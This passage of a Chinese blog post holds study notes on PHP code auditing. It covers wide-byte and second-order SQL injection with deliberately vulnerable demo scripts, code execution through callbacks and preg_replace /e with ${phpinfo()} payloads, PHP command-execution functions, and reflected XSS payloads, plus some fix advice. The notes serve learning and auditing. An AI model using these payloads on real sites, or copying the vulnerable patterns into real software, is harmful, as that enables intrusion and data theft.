<p>成功宽字节注入（payload <code>1%20%df%27%20union%20select%201,database(),3,4%20--+</code></p>
<p>修复建议：</p>
<p>使用<code>mysql_ser_charset(GBK)</code>指定字符集</p>
<p>使用<code>mysql_real_escape_string</code>进行转义</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">二阶注入：</span><br><span class="line">1.攻击者在http请求中提交恶意输入(输入的时候过滤了，但是进入数据库的时候还原了)</span><br><span class="line">2.恶意输入保存在数据库中</span><br><span class="line">3.攻击者提交第二次http请求</span><br><span class="line">4.未处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造sql语句</span><br><span class="line">5.如果攻击成功，在第二次请求响应中返回结果</span><br></pre></td></tr></table></figure>

<h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><p>reg.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$username</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    mysql_select_db(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user(id,username,password,phone) VALUES(&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$phone</span>&#x27;);&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>.mysql_error());</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;not&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;reg.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    id:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    username:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    password:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    phone:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;phone&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点击提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>search.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    mysql_select_db(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败1&quot;</span>.mysql_error());</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM USER WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败2&quot;</span>.mysql_error());</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ID:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;USERNAME:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;PASSWORD:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;PHONE:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;search.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    search ID:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点击搜索&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们的payload就可以在username那里加上<code>&#39;union select 1,2,database(),4;#</code></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151005452.png" alt="image-20220827151005452"></p>
<p>再查询0</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151016017.png" alt="image-20220827151016017"></p>
<p>但是为什么感觉就是再讲漏洞原理啊喂(#`O′)</p>
<p>思路：先将注入语句插入到数据库，注册、留言板等功能都具有insert数据库的操作，然后再使用update的地方触发插入到数据库的注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值&#x27;union select ......#</span><br></pre></td></tr></table></figure>

<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">用户能够控制函数输入</span><br><span class="line">存在可执行代码的危险函数</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151921288.png" alt="image-20220827151921288"></p>
<h2 id="常见的一些函数"><a href="#常见的一些函数" class="headerlink" title="常见的一些函数"></a>常见的一些函数</h2><p>eval()和assert()函数就不说了，直接把中间的参数当做php代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">回调函数：</span><br><span class="line">mixed call_user_func(callble $callback[,mixed $parameter[,mixed $...]])</span><br><span class="line">$callback是要调用自定义的函数名称</span><br><span class="line">$parameter是自定义函数的参数</span><br><span class="line">call_user_func — 把第一个参数作为回调函数调用 第二个参数当做回调函数的参数</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827165236507.png" alt="image-20220827165236507"></p>
<p>常见的回调函数：</p>
<p>call_user_func(),call_user_func_array(),array_map()等</p>
<p>这里不全，后面我自己会补充。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">动态执行函数</span><br><span class="line">1.定义一个函数</span><br><span class="line">2.将函数名（字符串）赋值给一个变量</span><br><span class="line">3.使用变量名代替函数名调用动态执行函数</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);#简单例子</span><br><span class="line">感觉就和免杀才开始那种一样，a做函数名，b做函数参数。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">preg_replace函数</span><br><span class="line"></span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br></pre></td></tr></table></figure>

<p>一般$pattern是正则</p>
<p>$pattern存在/e模式修正符修饰 允许代码执行,下面是其他修正符的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</span><br><span class="line">2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">4、/s 与/m相对，单行模式匹配。</span><br><span class="line">5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br><span class="line">6、/x 忽略空白模式。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中</span><br><span class="line">，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，</span><br><span class="line">最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的</span><br><span class="line">一位或两位十进制数。</span><br></pre></td></tr></table></figure>

<p>这里举一个简单的例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)<span class="subst">$cmd</span>&quot;</span>,<span class="string">&quot;\\1&quot;</span>,<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>上面的意思大概就是，从str中匹配前面有<code>&lt;php&gt;</code>的后面条件自己设定的字符，用//1来进行替换,但是我们又是/e模式，执行了第二个语句，那么就成功rce。</p>
<p>我们这里的payload就可这样<code>&lt;\/php&gt;/e</code>因为如果有特殊符号要转义，所以前面有个斜杠，匹配成功之后，就会被//1引用，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修复方案</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">使用自定义函数或函数库来代替外部应用程序或命令的应用</span><br><span class="line">使用escappeshellarg函数来处理命令的参数</span><br><span class="line">使用safe_mode_exec_dir来指定可执行的文件路径</span><br><span class="line">将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Reme_mber/article/details/124185032">(96条消息) php preg_replace /e 模式 漏洞分析_quan9i的博客-CSDN博客_preg_replace漏洞</a></p>
<p>这篇文章感觉不错，我搬运过来</p>
<h2 id="preg-replace详解"><a href="#preg-replace详解" class="headerlink" title="preg_replace详解"></a>preg_replace详解</h2><p>/e在php5.5的时候就被废弃</p>
<p>第一个案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&quot;/s*(.*)s*/ies&quot;</span>, <span class="string">&quot;\\1&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>那么我们可以看出其大致含义就是匹配出的任意内容，都用()包含起来，作为子字符串，存在缓冲区，\1是访问括号内的内容，此时我们上面那个代码，我们就可以构造如下payload进行rce</p>
<p>对于payload中${}的解释，它这里其实是一个可变变量<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a><br>我们输入了${phpinfo()}，那么它呢因为被括号包裹了，就会存进缓冲区，此时他是符合那个过滤函数的，所以要更替为第二个语句，而这里用到了/e，就相当于将第二个语句给执行了，就相当于eval(xx)，第二个语句也就是//1，而//1的含义是${phpinfo()},他这个时候总的语句呢就是eval(${phpinfo()}),这玩意就相当于变量里面套变量，所以我们需要先执行里面的，也就是${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)，此时我们呢再执行这个eval${1},这玩意能正常执行出来，由于我们没有给1赋值，他会给个警告，但是没问题，不影响我们的语句，所以这个时候我们的rce就实现了</p>
<p>第二个案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">preg_replace(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>,<span class="string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>,<span class="variable">$data</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=&lt;data&gt;$&#123;phpinfo()&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>分析原因，此时括号内的内容是${phpinfo()}，传到了缓冲区，执行后面语句时会调用，那么后面语句此时就相当于$ret=${phpinfo()}，肯定会先执行phpinfo()，然后呢返回了1，此时语句是$ret=1，加上我们的/e是执行语句的，所以这里执行的就等同于eval($ret=1)；我们本地测试一下输出结果</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827183314670.png" alt="image-20220827183314670">所以，这就是执行报错的原因所在，有没有解决办法呢，当然有，再加个<code>&#123;&#125;</code>，此时执行结果如下</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827183326474.png" alt="image-20220827183326474"></p>
<p>这是为啥呢，我们不妨再来分析一下，此时存入缓冲区的是{${phpinfo()}}，此时由于\1是反向引用，再加上/e，实际的执行语句就是eval($ret={${phpinfo()}})执行过里面之后，得到的就是eval($ret={1}),而里面会当做变量来执行，也就是eval($ret=${1})，此时就执行出来了。</p>
<p>第三个案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&quot;/s*(.*)s*/ies&quot;</span>, <span class="string">&quot;test(\\1)&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">*eval(&quot;\$&#123;phpinfo()&#125;&quot;);</span></span><br><span class="line"><span class="comment">*eval(&quot;test(\&quot;&#123;\$&#123;phpinfo()&#125;&#125;\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">*$&#123;phpinfo()&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<p>?h=${phpinfo()}</p>
<p>此时执行的就是<code>eval(test($&#123;phpinfo()&#125;)</code>，，而后为<code>eval(test(1))</code>，里面那个是空的，所以执行结果为空，没有错误，可以正常执行</p>
<h2 id="一些正则"><a href="#一些正则" class="headerlink" title="一些正则"></a>一些正则</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827170249923.png" alt="image-20220827170249923"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827171538419.png" alt="image-20220827171538419"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827180110497.png" alt="image-20220827180110497"></p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">用户能够控制函数输入</span><br><span class="line">存在可执行代码的危险函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型</span><br><span class="line">代码层过滤不严</span><br><span class="line">系统的漏洞造成命令注入</span><br><span class="line">调用的第三方组件存在代码执行漏洞</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827190243561.png" alt="image-20220827190243561"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system函数 自带回显的，不用输出也可</span><br><span class="line">system(string $command, int &amp;$return_var = ?): string</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru函数 也是自带回显</span><br><span class="line">passthru ( string $command [, int &amp;$return_var ] ) : void</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Exec函数  不自带回显</span><br><span class="line">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )；</span><br><span class="line"></span><br><span class="line">$command：表示要执行的命令。</span><br><span class="line"></span><br><span class="line">$output:如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</span><br><span class="line"></span><br><span class="line">$return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</span><br><span class="line"></span><br><span class="line">一般来说，我们只要写第一个参数，也就是$command。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell_exec函数  不自带回显的</span><br><span class="line">string shell_exec(string $cmd)</span><br><span class="line">$cmd 要执行的命令</span><br><span class="line">反引号``则调用此函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤函数</span><br><span class="line">Escapeshellcmd()</span><br><span class="line">过滤整条命令</span><br><span class="line"></span><br><span class="line">Escapeshellarg()</span><br><span class="line">过滤整个参数</span><br></pre></td></tr></table></figure>

<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">没有过滤的参数，传入到输出函数中</span><br><span class="line">搜索内容，发表文章，留言，评论回复，资料设置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反射xss常见场景</span><br><span class="line">将前端获取的内容，直接输出到浏览器页面</span><br><span class="line">将前端获取的内容，直接输出到HTML标签</span><br><span class="line">将前端获取的内容，直接输出到&lt;script&gt;标签</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;<span class="comment">//这就是没有过滤直接输出到浏览器的xss</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;&lt;?php echo $content;?&gt;&quot;&gt;</span><br><span class="line">//payload是 123?&gt;&quot;&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;#</span><br><span class="line">//闭合了标签</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827201453222.png" alt="image-20220827201453222"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var xss = &#x27;&lt;?php echo $content?&gt;&#x27;;</span><br><span class="line">    document.write(xss);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//payload是123%27;&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>存储其实和反射差不多，只不过大多是存在数据库的，需要别人点击去触发。</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827203219636.png" alt="image-20220827203219636"></p>
